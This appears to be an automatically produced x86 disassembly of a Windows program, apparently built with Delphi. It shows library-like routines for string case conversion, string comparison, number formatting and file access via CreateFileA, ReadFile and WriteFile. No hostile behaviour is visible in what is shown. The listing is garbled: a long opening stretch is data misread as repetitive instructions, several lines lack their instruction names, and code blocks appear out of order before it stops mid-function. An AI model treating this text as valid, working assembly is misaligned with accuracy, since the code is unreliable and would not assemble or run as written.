add dh bh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bh bh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add al ah
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add cl ah
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dl ah
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bl ah
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ah ah
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ch ah
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dh ah
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bh ah
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add al ch
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add cl ch
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dl ch
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bl ch
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ah ch
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ch ch
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dh ch
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bh ch
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add al dl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add cl dl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dl dl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bl dl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ah dl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ch dl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dh dl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bh dl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add al bl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add cl bl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dl bl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bl bl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ah bl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ch bl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dh bl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bh bl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add al al
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add cl al
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dl al
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bl al
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ah al
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ch al
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dh al
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bh al
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add al cl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add cl cl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dl cl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bl cl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ah cl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ch cl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dh cl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bh cl
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ eax + 0x640000ff ] dh
xchg [ edi ] al
mov cl 0xff
add [ eax ] al
xchg [ fs : edi ] al
mov dl 0xff
add [ eax ] al
xchg [ fs : edi ] al
mov bl 0xff
add [ eax ] al
xchg [ fs : edi ] al
mov ah 0xff
add [ eax ] al
xchg [ fs : edi ] al
mov ch 0xff
add [ eax ] al
xchg [ fs : edi ] al
mov dh 0xff
add [ eax ] al
xchg [ fs : edi ] al
mov bh 0xff
add [ eax ] al
xchg [ fs : edi ] al
mov eax 0x640000ff
xchg [ edi ] al
mov ecx 0x640000ff
xchg [ edi ] al
mov edx 0x640000ff
xchg [ edi ] al
mov ebx 0x640000ff
xchg [ edi ] al
mov esp 0x640000ff
xchg [ edi ] al
mov ebp 0x640000ff
xchg [ edi ] al
mov esi 0x640000ff
xchg [ edi ] al
mov edi 0x640000ff
xchg [ edi ] al
mov al [ 0x640000ff ]
xchg [ edi ] al
mov eax [ 0x640000ff ]
xchg [ edi ] al
mov [ 0x640000ff ] al
xchg [ edi ] al
mov [ 0x640000ff ] eax
xchg [ edi ] al
movsb [ edi ] [ esi ]
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebp + 0x640000ff ] ah
xchg [ edi ] al
cmpsb [ esi ] [ edi ]
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ edi + 0x640000ff ] ah
xchg [ edi ] al
test al 0xff
add [ eax ] al
xchg [ fs : edi ] al
test eax 0x640000ff
xchg [ edi ] al
stosb [ edi ]
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebx + 0x640000ff ] ch
xchg [ edi ] al
lodsb [ esi ]
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebp + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_40700d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407014
retn
sub_407ab6
inc eax
add [ ebx ] dl
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
inc ebx
outsd
jne r-xdata
loopne r-xdata
je r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407b0c3f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
jpo r-xdata
jb r-xdata
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
add [ eax ] ch
xor [ eax ] eax
mov al [ 0x240040cd ]
add [ eax ] ch
jpo r-xdata
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
cld

add eax 0xffffffd4
jmp sub_40cf18
sti
cmp eax [ eax ]
add al ch
sbb bh [ ebp + 0x5e5fffff ]
je r-xdata
push esp
dec ebp
jne r-xdata
add [ eax + 0x240040cd ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 + 0x300040 ] dl
add [ eax ] al
int3
pop ebx
retn
call sub_40b804
call sub_403928
pop edi
pop esi
push edx
popad
inc ebp
js r-xdata
insb
jne r-xdata
mov eax ebx
call sub_4026f4
mov esi eax
mov eax esi
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
mov edx ebx
call sub_402b80
mov eax esi
pop esi
pop ebx
retn
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
sub_407b89
push edi
inc eax
add [ eax ] ch
xor [ eax ] eax
mov al [ 0x240040cd ]
push esp
dec ebp
jne r-xdata
sti
cmp eax [ eax ]
add al ch
sbb bh [ ebp + 0x5e5fffff ]
je r-xdata
pop ebx
retn
call sub_40b804
call sub_403928
pop edi
pop esi
push edx
popad
inc ebp
js r-xdata
insb
jne r-xdata
mov eax ebx
call sub_4026f4
mov esi eax
mov eax esi
xor ecx ecx
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
mov edx ebx
call sub_402b80
mov eax esi
pop esi
pop ebx
retn
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
outsb
imul edi [ edx + 0x65 ] r-xdata
sub_407bbc
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407bf0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b804
call sub_403928
pop edi
pop esi
pop ebx
retn
sub_407c14
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026f4
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402b80
mov eax esi
pop esi
pop ebx
retn
sub_407c34
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_402714
call ebx
pop ebx
retn
sub_407c60
push ebx
mov ebx eax
mov eax 0xc
call sub_4026f4
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407c34
pop ebx
retn
sub_407c98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4041ac
mov ebx eax
mov eax edi
mov edx ebx
call sub_404538
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407cd4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4041ac
mov ebx eax
mov eax edi
mov edx ebx
call sub_404538
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407d10
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407d40
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407d60
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407db4
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407d60
test eax eax
jne r-xdata
sub_407dd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4041ac
push eax
mov eax esi
call sub_4043ac
push eax
mov eax ebx
call sub_4041ac
push eax
mov eax ebx
call sub_4043ac
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407e10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4041ac
push eax
mov eax esi
call sub_4043ac
push eax
mov eax ebx
call sub_4041ac
push eax
mov eax ebx
call sub_4043ac
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407e60
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407e80
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_4041ac
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403eec
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_40440c
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407ed0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4041ac
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_4041ac
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_407f34
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_407f4a
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_407f4a
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407f4a
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407f80
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_407f34
mov edx esi
pop eax
call sub_403fdc
add esp 0x10
pop esi
retn
sub_407fa0
or cl cl
jne sub_407fd4
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_407fd4
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_407fd4
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_407fd4
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40806c
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_407fa0
mov edx esi
pop eax
call sub_403fdc
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_408094
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_407f34
mov edx esi
pop eax
call sub_403fdc
add esp 0x20
pop esi
retn
xor edx edx
sub_4080bc
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402ba0
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407bf0
sub_408110
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402ba0
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408130
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404cb4
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408150
mov eax [ rw-data ]
call sub_404ee4
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404ee4
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050a0
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f40
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050a0
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f40
sub_4081e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407e48
test al al
je r-xdata
sub_40821c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409408
mov edx eax
test dl dl
je r-xdata
call sub_408150
push ebp
mov eax [ rw-data ]
call sub_404eec
mov edx eax
mov eax [ rw-data ]
call sub_4081e0
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404eec
mov edx eax
mov eax [ rw-data ]
call sub_4081e0
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_4082b8
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f40
call sub_408150
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f40
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f40
jmp r-xdata
pop esi
pop ebx
retn
sub_408304
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_4043ac
push eax
call CreateFileA
sub_40835c
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_4043ac
push eax
call CreateFileA
pop ebx
retn
sub_408388
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4083b4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4083e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408420
push ebx
push esi
mov esi eax
mov eax esi
call sub_4041ac
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c0c0
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408450
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_4041ac
mov edi eax
mov eax ebx
call sub_4043ac
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408738
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c0c0
cmp al 0x2
jne r-xdata
dec edi
sub_4084a0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408450
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_40440c
pop edi
pop esi
pop ebx
retn
sub_4084d8
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_4043ac
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_403fdc
add esp 0x108
pop esi
pop ebx
retn
sub_408514
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404c90
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404c90
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_4085c4
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_4085ec
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ edi - 0x1 ]
pop esi
pop edi
retn
sub_408618
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_40864c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_4041ac
push eax
mov eax ebx
call sub_4043ac
mov edx eax
mov eax esi
pop ecx
call sub_408618
pop esi
pop ebx
retn
sub_408670
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4043ac
mov edx eax
mov ecx edi
mov eax ebx
call sub_408618
pop edi
pop esi
pop ebx
retn
sub_408690
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_4086b4
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4086f4
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_40874c
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_4087c0
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408588
mov esi eax
inc esi
mov eax esi
call sub_4087a0
mov ecx esi
mov edx ebx
call sub_4085b4
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_4087fc
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c0e4
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_4085b4
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407bf0
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408884
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408bdb
pop edi
pop esi
